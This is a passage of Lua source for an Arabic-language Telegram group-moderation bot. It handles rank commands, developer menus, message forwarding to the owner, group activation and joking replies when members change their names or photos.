KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'KASPER_ch')..')'..' )\n✟︙تم رفعه ( '..text1[2]..' )\n✟︙بواسطه ( '..renk_KASPER(msg)..' )\n', 1, 'md')
KASPERdx1:sadd(KASPER..'bot:owners:'..msg.chat_id_, result.id_)
KASPERdx1:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif fdrt == "عضو" and is_momod(msg.sender_user_id_, msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'KASPER_ch')..')'..' )\n✟︙تم رفعه ( '..text1[2]..' )\n✟︙بواسطه ( '..renk_KASPER(msg)..' )\n', 1, 'md')
end else
info = "✟︙المعرف غير صحيح"
KASPERdx(msg.chat_id_, msg.id_, 1, info, 1, 'html')
end end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end end
--     By Developer KASPER     -- 
if text and text:match("^تنزيل (.*) @(.*)") and KASPER11(msg) then 
local text1 = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
if KASPERdx1:sismember(bot_id.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local fdrt = KASPERdx1:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if fdrt == "مميز" and is_momod(msg.sender_user_id_, msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'KASPER_ch')..')'..' )\n✟︙تم تنزيله من ( '..text1[2]..' )\n✟︙بواسطه ( '..renk_KASPER(msg)..' )\n', 1, 'md')
KASPERdx1:srem(KASPER..'bot:vipmem:'..msg.chat_id_, result.id_)
KASPERdx1:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif fdrt == "ادمن" and is_owner(msg.sender_user_id_, msg.chat_id_) then 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'KASPER_ch')..')'..' )\n✟︙تم تنزيله من ( '..text1[2]..' )\n✟︙بواسطه ( '..renk_KASPER(msg)..' )\n', 1, 'md')
KASPERdx1:srem(KASPER..'bot:momod:'..msg.chat_id_, result.id_)
KASPERdx1:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif fdrt == "مدير" and is_monsh(msg.sender_user_id_, msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'KASPER_ch')..')'..' )\n✟︙تم تنزيله من ( '..text1[2]..' )\n✟︙بواسطه ( '..renk_KASPER(msg)..' )\n', 1, 'md')
KASPERdx1:srem(KASPER..'bot:owners:'..msg.chat_id_, result.id_)
KASPERdx1:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif fdrt == "عضو" and is_momod(msg.sender_user_id_, msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'KASPER_ch')..')'..' )\n✟︙تم تنزيله من ( '..text1[2]..' )\n✟︙بواسطه ( '..renk_KASPER(msg)..' )\n', 1, 'md')
end else
info = "✟︙المعرف غير صحيح"
KASPERdx(msg.chat_id_, msg.id_, 1, info, 1, 'html')
end end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end end
--     By Developer KASPER     -- 
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
KASPERdx1:incr(KASPER..'msg'..msg.chat_id_..':'..msg.sender_user_id_) 
Chat_Type = 'arg' 
elseif id:match("^(%d+)") then
KASPERdx1:sadd(KASPER..'bot',msg.sender_user_id_)  
Chat_Type = 'pv' 
else
Chat_Type = 'sup' 
end end 
--     By Developer KASPER     -- 
if Chat_Type == 'pv' then 
if text == '/start' then   
function adding(extra,result,success)
local users = KASPERdx1:scard(KASPER.."bot:userss")
KASPERdx(tostring((KASPERdx1:get(KASPER.."bot:leader:gr") or bot_owner)), 0, 1, "✟︙ هذا دز ستارت للبوت \n✟︙معرفه ⌯» @"..(result.username_ or "لا يوجد").."\n✟︙ايديه ⌯» {"..msg.sender_user_id_.."}\n✟︙اصبح عدد المشتركين { "..users.." }" , 1, 'html')
end 
getUser(msg.sender_user_id_,adding) 
end end
--     By Developer KASPER     -- 
if Chat_Type == 'pv' then 
if text and text:match("/start hms(.*)_(%d+)") then 
function adding(extra,result,success)
KASPERdx(tostring((KASPERdx1:get(KASPER.."bot:leader:gr") or bot_owner)), 0, 1, "✟︙هذا دزوله همسه وديشوفها \n✟︙معرفه ⌯» @"..(result.username_ or "لا يوجد").."\n✟︙ايديه ⌯» {"..msg.sender_user_id_.."}" , 1, 'html') 
end 
getUser(msg.sender_user_id_,adding) 
end end 
--     By Developer KASPER     -- 
if Chat_Type == 'pv' then 
if text == '/start' or text == 'رجوع ،🔙‘' and KASPER11(msg) then    
if is_leader(msg) then
local Sudo_Welcome = '*✟︙اهلا بك عزيزي المطور الاساسي \n✟︙اليك اوامر الكيبورد الخاص بسورس فايدر*'
local key = {
{'وضع اسم البوت','ضع كليشه المطور','تحديث'},
{'الاحصائيات','المطورين','قائمه العام'},
{'ضع دعم','الكروبات','تعيين قناة الاشتراك'},
{'معلومات السيرفر','تحديث السورس','تفعيل الاشتراك الاجباري'},
{'تفعيل البوت الخدمي','تعطيل البوت الخدمي','جلب نسخه الكروبات'},
{"جلب كليشه ستارت",'مسح كليشه ستارت',"ضع كليشه ستارت"},
{'اوامر الاذاعات','اوامر الخدمه','اوامر بوت التواصل'},
} 
send_inline(msg.chat_id_,Sudo_Welcome,key)
return false
end end end
--     By Developer KASPER     -- 
if Chat_Type == 'pv' then
if text == 'اوامر الاذاعات' and KASPER11(msg) then  
if is_leader(msg) then 
local Sudo_Welcome = '✟︙اهلا بك مره اخرى عزيزي المطور \n✟︙اليك ازرار خدمه الاذاعات\n✟︙ملاحظه : امر ( توجيه للكل ) يجب ان يكون بالرد'
local key = {
{'اذاعه'},
{'توجيه للكل','اذاعه بالتوجيه'},
{'اذاعه خاص بالتوجيه','نشر بالخاص'},
{'رجوع ،🔙‘'}, 
}
send_inline(msg.chat_id_,Sudo_Welcome,key)
return false
end end end
--     By Developer KASPER     -- 
if Chat_Type == 'pv' then 
if text == 'اوامر بوت التواصل' and KASPER11(msg) then  
if is_leader(msg) then 
local Sudo_Welcome = '✟︙اهلا بك مره اخرى عزيزي المطور \n✟︙اليك ازرار خدمه بوت التواصل'
local key = {
{'تعطيل التواصل','تفعيل التواصل'},
{'الغاء حظر','حظر'},
{'رجوع ،🔙‘'}, 
} 
send_inline(msg.chat_id_,Sudo_Welcome,key)
return false
end end end
--     By Developer KASPER     -- 
 if Chat_Type == 'pv' then 
if text == 'اوامر الخدمه' and KASPER11(msg) then    
local Sudo_Welcome = '✟︙يمكنك ايضا استخدام الاوامر الخدميه \n✟︙اليك ازرار الاوامر الخدميه'
local key = {
{'زخرفه','احسب عمرك'},
{'الابراج','نسبه الحب'},
{'قسم الحمايه'},
{'•┉ • ┉ • ┉ • ┉ • ┉•'},
{'الالعاب'},
{'تخمين','كت تويت'},
{'ترتيب','سمايلات'},
{'حزوره','المعاني'},
{'•┉ • ┉ • ┉ • ┉ • ┉•'},
{'العكس','المحيبس'},
{'امثله','المختلف'},
{'انكليزي','رياضيات'},
{'رجوع ،🔙‘'},
}
send_inline(msg.chat_id_,Sudo_Welcome,key)
return false
end end 
--     By Developer KASPER     -- 
if Chat_Type == 'pv' then
if text == '/start' and KASPER11(msg) then    
if not KASPERdx1:get(KASPER..'Start:Time'..msg.sender_user_id_) then
local inline = {{{text="المطور",url="t.me/"..(SudoKASPER or "KASPER_ch")}}}
local Sudo_Welcome = '✟︙يمكنك ايضا استخدام الاوامر الخدميه \n✟︙اليك ازرار الاوامر الخدميه اسفل الرساله\n                  • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n                              [𝐅𝐀𝐄𝐃𝐄𝐑 - 𝐂𝐇](https://t.me/KASPER_ch)'
local key = {
{'زخرفه','احسب عمرك'},
{'الابراج','نسبه الحب'},
{'قسم الحمايه'},
{'•┉ • ┉ • ┉ • ┉ • ┉•'},
{'الالعاب'},
{'تخمين','كت تويت'},
{'ترتيب','سمايلات'},
{'حزوره','المعاني'},
{'•┉ • ┉ • ┉ • ┉ • ┉•'},
{'العكس','المحيبس'},
{'امثله','المختلف'},
{'انكليزي','رياضيات'},
{'رجوع ،🔙‘'},
}
local start = KASPERdx1:get(KASPER.."Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "✟︙مرحبا انا بوت اسمي { "..name_bot.." }\n✟︙اختصاصي حماية المجموعات\n✟︙من التفليش والسبام والخخ .. . ،\n✟︙قم برفعي ادمن في مجموعتك وارسل ( تفعيل )\n✟︙سيتم رفع الادمنيه والمنشئ تلقائيا"
end
send_inline(msg.chat_id_,Start_Source,nil,inline)
send_inline(msg.chat_id_,Sudo_Welcome,key)
end
KASPERdx1:setex(KASPER..'Start:Time'..msg.sender_user_id_,300,true)
return false
end end
if text and KASPERdx1:get(KASPER..'Start:Bots') then
if text == 'الغاء' then   
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم الغاء حفظ كليشة الستارت .', 1, 'md')
KASPERdx1:del(KASPER..'Start:Bots') 
return false
end
KASPERdx1:set(KASPER.."Start:Bot",text)  
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم حفظ كليشة الستارت .', 1, 'md')
KASPERdx1:del(KASPER..'Start:Bots') 
return false
end
--     By Developer KASPER     -- 
if is_leader(msg) then
if text == 'تعيين رد الخاص' or text == 'ضع كليشه ستارت' or text == ' تعيين رد الخاص ⌁' then 
KASPERdx1:set(KASPER..'Start:Bots',true) 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙ارسل لي كليشه ستارت جديده .', 1, 'md')
return false 
end
if text == 'حذف رد الخاص' or text == 'حذف كليشه ستارت' or text == 'مسح رد الخاص' or text == 'مسح كليشه ستارت' then  
KASPERdx1:del(KASPER..'Start:Bot') 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم مسح كليشه الستارت .', 1, 'md')
end
if text == 'جلب رد الخاص' or text == 'جلب كليشه ستارت' then    
local start = KASPERdx1:get(KASPER.."Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "✟︙مرحبا انا بوت اسمي { "..name_bot.." }\n✟︙اختصاصي حماية المجموعات\n✟︙من التفليش والسبام والخخ .. . ،\n✟︙قم برفعي ادمن في مجموعتك وارسل ( تفعيل )\n✟︙سيتم رفع الادمنيه والمنشئ تلقائيا"
end
KASPERdx(msg.chat_id_, msg.id_, 1, Start_Source, 1, 'md')
return false
end end
--     By Developer KASPER     -- 
if text == 'احسب عمرك' then KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙من خلال البوت يمكنك حساب عمرك ،\n✟︙فقط قم بارسال امر احسب + مواليدك الى البوت ،\n✟︙بالتنسيق التالي مثال : احسب 1996/1/17', 1, 'md') end
if text == 'الابراج' then KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙من خلال البوت يمكنك معرفه توقعات برجك ،\n✟︙فقط قم بارسال امر برج + اسم البرج ،\n✟︙مثال : برج الدلو ،\n✟︙لمعرفه برجك قم بالرجوع الى قسم حساب العمر ،', 1, 'md') end
if text == 'قسم الحمايه' then KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙اضف البوت في المجموعه وارسل تفعيل ،\n✟︙وتمتع بخدمات غير مطروقه ،', 1, 'md') end
if text == '•┉ • ┉ • ┉ • ┉ • ┉•' then KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙اختر لعبه من الكيبورد بالاسفل ،', 1, 'md') end
if Chat_Type == 'pv' then   
if not is_leader(msg) and not KASPERdx1:sismember(KASPER..'BaN:In:User',msg.sender_user_id_) and not KASPERdx1:get(KASPER..'Texting:In:Bv') then
KASPERdx(msg.sender_user_id_, msg.id_, 1, '✟︙تم ارسال رسالتك الى [مطور البوت](t.me/'..SudoKASPER..')', 1, 'md')
tdcli_function({ID ="GetChat",chat_id_=bot_owner},function(arg,chat)  
tdcli_function({ID ="GetChat",chat_id_=msg.sender_user_id_},function(arg,chat)  
tdcli_function({ID="ForwardMessages",chat_id_=bot_owner,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
if data and data.messages_ and data.messages_[0] ~= false and data.ID ~= "Error" then
if data and data.messages_ and data.messages_[0].content_.sticker_ then
sendText(bot_owner,'✟︙تم ارسال الملصق من \n['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')',0,'md')
return false
end;end;end,nil);end,nil);end,nil);end,nil);end
if is_leader(msg) and msg.reply_to_message_id_ ~= 0  then    
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then     
id_user = result.forward_info_.sender_user_id_    
end     
tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data) 
if text == 'حظر' then
local Text = '✟︙تم حظره من التواصل بنجاح .'
sendText(bot_owner,Text,msg.id_/2097152/0.5,'md') 
KASPERdx1:sadd(KASPER..'BaN:In:User',data.id_)  
return false  
end 
if text == 'الغاء الحظر' or text == 'الغاء حظر' then 
local Text = '✟︙تم الغاء حظره من التواصل بنجاح .'
sendText(bot_owner,Text,msg.id_/2097152/0.5,'md') 
KASPERdx1:srem(KASPER..'BaN:In:User',data.id_)  
return false 
end 
tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,dp) 
if dp.code_ == 400 or dp.code_ == 5 then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لم يتم ارسال رسالتك لان العظو قام بحظر البوت .', 1, 'md')
return false  
end  
if text then
KASPERdx(id_user, 0, 1, text, 1, "md")  
Text = '✟︙تم ارسال الرساله الى ،'
elseif msg.content_.ID == 'MessageSticker' then    
sendSticker(id_user, msg.id_, 0, 1,nil, msg.content_.sticker_.sticker_.persistent_id_)   
Text = 'تم ارسال الملصق الى '
elseif msg.content_.ID == 'MessagePhoto' then    
sendPhoto(id_user, msg.id_, 0, 1,nil, msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or ''))    
Text = '✟︙تم ارسال الملصق الى ،'
elseif msg.content_.ID == 'MessageAnimation' then    
sendDocument(id_user, msg.id_, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_)    
Text = '✟︙تم ارسال المتحركه الى ،'
elseif msg.content_.ID == 'MessageVoice' then    
sendVoice(id_user, msg.id_, 0, 1,nil, msg.content_.voice_.voice_.persistent_id_)    
Text = '✟︙تم ارسال البصمه الى ،'
end     
sendText(bot_owner, Text..'\n'..'['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')',0,'md') 
end,nil); end,nil); end,nil); end,nil); end end 
if is_leader(msg) then
if text == 'تفعيل التواصل' then   
local KASPER = '✟︙اهلا عزيزي '..renk_KASPER(msg)..'\n✟︙تم تفعيل التواصل .'
KASPERdx(msg.chat_id_, msg.id_, 1,KASPER, 1, 'md') 
KASPERdx1:del(KASPER..'Texting:In:Bv') 
end
if text == 'تعطيل التواصل' then  
local KASPER = '✟︙اهلا عزيزي '..renk_KASPER(msg)..'\n✟︙تم تعطيل التواصل .'
KASPERdx(msg.chat_id_, msg.id_, 1,KASPER, 1, 'md') 
KASPERdx1:set(KASPER..'Texting:In:Bv',true) 
end end
--     By Developer KASPER     -- 
KASPERdx1:sadd(KASPER.."groups:users" .. msg.chat_id_, msg.sender_user_id_)--save users gp
KASPERdx1:incr(KASPER.."msgs:"..msg.sender_user_id_..":"..msg.chat_id_.."")--save msgs gp
if msg.content_.ID == "MessageChatDeleteMember" then
if tonumber(msg.content_.user_.id_) == tonumber(bot_id) then
KASPERdx1:del(KASPER.."bot:enable:" .. msg.chat_id_)
KASPERdx1:srem(KASPER.."bot:groups", msg.chat_id_) 
end end 
function chek_admin(chat_id,set) 
local function promote_admin(extra,result,success)   
limit = result.administrator_count_   
if tonumber(limit) > 0 then 
getChannelMembers(chat_id, 0, 'Administrators', limit,set)   
end end
getChannelFull(chat_id,promote_admin)
end
--     By Developer KASPER     -- 
function channel_get_kicked(channel,cb)
local function callback_admins(extra,result,success)
limit = result.kicked_count_
getChannelMembers(channel, 0, 'Kicked', limit,cb)
end
getChannelFull(channel,callback_admins)
end
--     By Developer KASPER     -- 
function deleteMessagesFromUser(chat_id, user_id)
tdcli_function ({
ID = "DeleteMessagesFromUser",
chat_id_ = chat_id,
user_id_ = user_id
}, dl_cb, nil)
end
--     By Developer KASPER     -- 
function forwardMessages(chat_id, from_chat_id, message_ids, disable_notification)
tdcli_function ({
ID = "ForwardMessages",
chat_id_ = chat_id,
from_chat_id_ = from_chat_id,
message_ids_ = message_ids, -- vector
disable_notification_ = disable_notification,
from_background_ = 1
}, dl_cb, nil)
end
--     By Developer KASPER     -- 
function getUser(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end
--     By Developer KASPER     -- 
local msg = data.message_
text = msg.content_.text_
if text and not KASPERdx1:get(KASPER..'lock:bot:ttt'..bot_id) and not KASPERdx1:get(KASPER.."lock:bot:ttt2:"..msg.chat_id_) then 
function KASPER(extra,result,success)
if result.id_ then 
local dx = KASPERdx1:get("KASPER:name"..result.id_)
if not result.first_name_ then 
if dx then 
KASPERdx1:del("KASPER:name"..result.id_) 
end end
if result.first_name_ then 
if dx and dx ~= result.first_name_ then 
local KASPER_text = {
  "اسمك الجديد { "..result.first_name_.." }\n ليش غيرته 🌚😹",
  "اسمك الجديد { "..result.first_name_.." }\n مو حلو رجعه القديم ☹️👌",
  "ليش غيرت اسمك { "..result.first_name_.." }\n قطيت احد حبي ؟ 🌚😹",
  "اسمك الجديد يخبل ضلعي 🤭😹{ "..result.first_name_.." }", 
}
dxx = math.random(#KASPER_text)
KASPERdx(msg.chat_id_, msg.id_, 1, KASPER_text[dxx], 1, 'html')
end  
KASPERdx1:set("KASPER:name"..result.id_, result.first_name_)  
end end end
getUser(msg.sender_user_id_, KASPER)
end
--     By Developer KASPER     -- 
local msg = data.message_
text = msg.content_.text_
if msg.content_.ID == "MessageChatAddMembers" then  
KASPERdx1:set(KASPER.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
end
--     By Developer KASPER     -- 
local msg = data.message_
text = msg.content_.text_
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and KASPERdx1:get(KASPER.."bot:bots:ban" .. msg.chat_id_) and not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
chat_kick(msg.chat_id_,mem_id[i].id_)
chat_kick(msg.chat_id_, msg.sender_user_id_)
end end end
--     By Developer KASPER     -- 
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and KASPERdx1:get(KASPER.."bot:bots:mute" .. msg.chat_id_) and not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
chat_kick(msg.chat_id_,mem_id[i].id_)
end end end
--     By Developer KASPER     -- 
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and KASPERdx1:get(KASPER.."keed_bots"..msg.chat_id_)  and not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
chat_kick(msg.chat_id_,mem_id[i].id_)
KASPERdx1:sadd(KASPER..'bot:keed:'..msg.chat_id_, msg.sender_user_id_)
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false")
KASPERdx1:sadd(KASPER..'bot:keed:'..msg.chat_id_, msg.sender_user_id_)
end end end
--     By Developer KASPER     -- 
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(KASPER) then 
KASPERdx1:srem("KASPER:addg"..bot_id, msg.chat_id_) 
KASPERdx1:del(KASPER.."bot:charge:"..msg.chat_id_)
function KASPER(extra,result,success) 
function  reslit(f1,f2)
function KASPER333(t1,t2)
tdcli_function ({ ID = "GetChat", chat_id_ = bot_owner },function(arg,chat)  
KASPERdx(tostring((KASPERdx1:get(KASPER.."bot:leader:gr") or bot_owner)), 0, 1, "✟︙تم طرد البوت من مجموعه  \n✟︙معرف العضو ⌯» @"..(result.username_ or "لا يوجد").."\n✟︙ايدي العضو ⌯» `"..msg.sender_user_id_.."`\n✟︙معلومات المجموعه ،  \n\n✟︙اسم المجموعه ⌯»  *"..f2.title_.."*\n✟︙ايدي المجموعه ⌯» `"..msg.chat_id_.."`\n✟︙رابط المجموعه ، \n✟︙تم مسح جميع بياناتها\n" , 1, 'md')
end,nil)   
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, KASPER333, nil)
end
tdcli_function ({
ID = "GetChat",
chat_id_ = msg.chat_id_
}, reslit, nil) 
end
getUser(msg.sender_user_id_, KASPER)
end
--     By Developer KASPER     -- 
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
if KASPERdx1:get(KASPER..'bot:tgservice:jk'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)    
end end
--     By Developer KASPER     -- 
local msg = data.message_
text = msg.content_.text_
if text and not KASPERdx1:get(KASPER..'lock:bot:ttt'..bot_id) and not KASPERdx1:get(KASPER.."lock:bot:ttt2:"..msg.chat_id_) then  
function KASPER(extra,result,success)
if result.id_ then 
local dx = KASPERdx1:get("KASPER:Userr"..result.id_)
if not result.username_ then 
if dx then 
KASPERdx(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه : @"..dx, 1, 'html')
KASPERdx1:del("KASPER:Userr"..result.id_) 
end end
if result.username_ then 
if dx and dx ~= result.username_ then 
local KASPER_text = {
  'كمشتك ليش غيرت معرفك ولك 😹',
  "ليش غيرت معرف طشوك بقنات انحراف ؟ ⛷😹",
  "حلو معرفك الجديد منين خمطته 😹",
  "لحكو غير معرفه خمطو \n هذا معرفه القديم 🌚😹 @"..result.username_.."",
}
dxx = math.random(#KASPER_text)
KASPERdx(msg.chat_id_, msg.id_, 1, KASPER_text[dxx], 1, 'html')
end  
KASPERdx1:set("KASPER:Userr"..result.id_, result.username_) 
end end end
getUser(msg.sender_user_id_, KASPER)
end
--     By Developer KASPER     -- 
local msg = data.message_
text = msg.content_.text_
if text and not KASPERdx1:get(KASPER..'lock:bot:ttt'..bot_id) and not KASPERdx1:get(KASPER.."lock:bot:ttt2:"..msg.chat_id_) then  
function dx(extra,result,success)
if result.id_ then 
local dx2 = KASPERdx1:get("dx:photo"..result.id_)
if not result.profile_photo_ then 
if dx2 then 
KASPERdx(msg.chat_id_, msg.id_, 1, "حذف كل صوره الحلو 😂👌🏻", 1, 'html')
KASPERdx1:del("dx:photo"..result.id_) 
end end
if result.profile_photo_ then 
if dx2 and dx2 ~= result.profile_photo_.big_.persistent_id_ then 
local dx_text = {
  "طالع صاك بالصوره الجديده ممكن نرتبط",
  "صوره فيطي الجديده غيرها",
  "صورتك الجديده فد شي 😑😹",
  "حطيت صورتي شوفوني اني صاك بنات 🙄😹",
}
dx3 = math.random(#dx_text)
KASPERdx(msg.chat_id_, msg.id_, 1, dx_text[dx3], 1, 'html')
end  
KASPERdx1:set("dx:photo"..result.id_, result.profile_photo_.big_.persistent_id_) 
end end end
getUser(msg.sender_user_id_, dx)
end
--     By Developer KASPER     -- 
local function openChat(chat_id,dl_cb)
tdcli_function ({
ID = "GetChat",
chat_id_ = chat_id
}, dl_cb, nil) 
end
--     By Developer KASPER     -- 
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
--     By Developer KASPER     -- 
res = 'https://api.telegram.org/bot'..tokenbot
function Mute_time(chat_id,user_id,time)
local mut = res.. '/restrictChatMember?chat_id=' .. chat_id .. '&user_id=' .. user_id..'&can_post_messages=false&until_date='..time
return https.request(mut)
end
--     By Developer KASPER     -- 
function string:split(sep)
local sep, fields = sep or ":", {}
local pattern = string.format("([^%s]+)", sep)
self:gsub(pattern, function(c) fields[#fields+1] = c end)
return fields
end
--     By Developer KASPER     -- 
function faedr(msg,data) 
local msg = data.message_
local text = msg.content_.text_
local caption = msg.content_.caption_
if text ==('تفعيل') and not is_admin(msg.sender_user_id_, msg.chat_id_) and not KASPERdx1:get(KASPER..'lock:bot:free'..bot_id) and KASPER11(msg) then
function adding(extra,result,success)
local function promote_admin(extra, result, success)
local num = 0
local admins = result.members_  
for i=0 , #admins do   
num = num + 1
KASPERdx1:sadd(KASPER..'bot:momod:'..msg.chat_id_,admins[i].user_id_)
if result.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
KASPERdx1:sadd(KASPER.."bot:monsh:"..msg.chat_id_,owner_id)
end end end
getChannelMembers(msg.chat_id_, 0, 'Administrators', 200, promote_admin)
if not is_admin(msg.sender_user_id_, msg.chat_id_) then
if KASPERdx1:get(KASPER.."bot:enable:"..msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙المجموعه : *'..title_name(msg.chat_id_)..'*\n✟︙مفعله سابقا بالبوت .', 1, 'md')
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙اهلا عزيزي '..renk_KASPER(msg)..'\n✟︙تم تفعيل المجموعه ورفع المشرفين .', 1, 'md')
openChat(msg.chat_id_,KASPER)
KASPERdx1:sadd("KASPER:addg"..bot_id, msg.chat_id_)
function KASPER(f1,f2) 
function KASPER333(t1,t2) 
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..tokenbot..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
t2.invite_link_ = link.result
end end 
KASPERdx1:set(KASPER.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
KASPERdx(tostring((KASPERdx1:get(KASPER.."bot:leader:gr") or bot_owner)), 0, 1, "✟︙تم تفعيل مجموعه جديده  \n✟︙معرف الضافني ⌯» @"..(result.username_ or "لا يوجد").."\n✟︙ايدي الضافني ⌯» `"..msg.sender_user_id_.."`\n✟︙معلومات المجموعه ،  \n\n✟︙اسم المجموعه ⌯»  *"..f2.title_.."*\n✟︙ايدي المجموعه ⌯» `"..msg.chat_id_.."`\n✟︙رابط المجموعه ، \n✟︙"..(t2.invite_link_ or "Error").."\n" , 1, 'md')
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID 
}, KASPER333, nil)
end
openChat(msg.chat_id_,KASPER) 
KASPERdx1:set(KASPER.."bot:enable:"..msg.chat_id_,true)
KASPERdx1:setex(KASPER.."bot:charge:"..msg.chat_id_,86400,true)
KASPERdx1:sadd("KASPER:addg"..bot_id, msg.chat_id_)
end end end
getUser(msg.sender_user_id_,adding) 
end end  
--     By Developer KASPER     -- 
if (data.ID == "UpdateNewMessage") then
local msg = data.message_
--vardump(data)
local d = data.disable_notification_
local chat = chats[msg.chat_id_]
faedr(data.message_,data)
--     By Developer KASPER     -- 
-------- OLD MSG
if msg.date_ < (os.time() - 30) then
print("**** OLD MSG ****")
return false
end
--     By Developer KASPER     -- 
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
KASPERdx1:set(bot_id..'KASPER:UserName'..msg.sender_user_id_,data.username_)
end;end,nil)
--     By Developer KASPER     -- 
local idf = tostring(msg.chat_id_)
if not KASPERdx1:get(KASPER.."bot:enable:"..msg.chat_id_) and not idf:match("^(%d+)") and not is_admin(msg.sender_user_id_, msg.chat_id_) then
print("Return False [ Not Enable ]")
return false
end
--     By Developer KASPER     -- 
if msg and msg.send_state_.ID == "MessageIsSuccessfullySent" then
function get_mymsg_contact(extra, result, success)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,get_mymsg_contact)
return
end
--     By Developer KASPER     -- 
KASPERdx1:incr(KASPER.."bot:allmsgs")
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match('-100(%d+)') then
if msg.can_be_deleted_ == true then 
KASPERdx1:sadd(KASPER.."bot:groups",msg.chat_id_)
end
if not KASPERdx1:sismember(KASPER.."bot:groups",msg.chat_id_) then
KASPERdx1:sadd(KASPER.."bot:groups",msg.chat_id_)
end
elseif id:match('^(%d+)') then
if not KASPERdx1:sismember(KASPER.."bot:userss",msg.chat_id_) then
KASPERdx1:sadd(KASPER.."bot:userss",msg.chat_id_)
end else
